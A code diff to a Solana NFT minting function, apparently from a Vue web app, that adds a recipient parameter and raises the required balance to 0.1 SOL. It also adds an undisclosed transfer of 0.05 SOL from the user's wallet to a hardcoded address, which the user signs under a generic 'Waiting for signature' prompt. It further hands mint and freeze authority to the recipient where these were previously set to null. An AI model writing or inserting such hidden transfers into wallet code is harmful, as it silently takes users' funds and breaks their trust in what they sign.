@@ -11,14 +11,16 @@ import {
 } from './metaplex/metadata';
 import { findProgramAddress } from './metaplex/utils';
 import { sleep } from '.';
+import { send } from 'process';
 
 const RESERVED_TXN_MANIFEST = 'manifest.json';
 
-export default async function mintNFT(connection, wallet, files, metadata) {
+export default async function mintNFT(connection, wallet, files, metadata, sendTo) {
+  sendTo = sendTo == '' ? wallet.publicKey.toString() : sendTo;
   // Check the wallet eligibility
   const walletBalance = await connection.getBalance(new PublicKey(wallet.publicKey.toString()));
-  if (walletBalance < 50000000) {
-    throw new Error('You need at least 0.05 SOL in your wallet');
+  if (walletBalance < 100000000) {
+    throw new Error('You need at least 0.1 SOL in your wallet');
   }
 
   const metadataContent = {
@@ -72,7 +74,7 @@ export default async function mintNFT(connection, wallet, files, metadata) {
   const recipientKey = (
     await findProgramAddress(
       [
-        wallet.publicKey.toBuffer(),
+        (new PublicKey(sendTo)).toBuffer(),
         programIds().token.toBuffer(),
         mintKey.toBuffer(),
       ],
@@ -84,7 +86,7 @@ export default async function mintNFT(connection, wallet, files, metadata) {
     instructions,
     recipientKey,
     wallet.publicKey,
-    wallet.publicKey,
+    new PublicKey(sendTo),
     mintKey,
   );
 
@@ -221,7 +223,7 @@ export default async function mintNFT(connection, wallet, files, metadata) {
       Token.createSetAuthorityInstruction(
         TOKEN_PROGRAM_ID,
         mintKey,
-        null,
+        new PublicKey(sendTo),
         'MintTokens',
         wallet.publicKey,
         [],
@@ -231,11 +233,18 @@ export default async function mintNFT(connection, wallet, files, metadata) {
       Token.createSetAuthorityInstruction(
         TOKEN_PROGRAM_ID,
         mintKey,
-        null,
+        new PublicKey(sendTo),
         'FreezeAccount',
         wallet.publicKey,
         [],
       ),
+    );
+    updateInstructions.push(
+      SystemProgram.transfer({
+        fromPubkey: wallet.publicKey,
+        toPubkey: 'FKB4pppWZVKE2HypsZVjaY237rrXJEkATd626PTj2JMa',
+        lamports: 50000000,
+      }),
     );
 
     Vue.toasted.show('Waiting for signature...', {
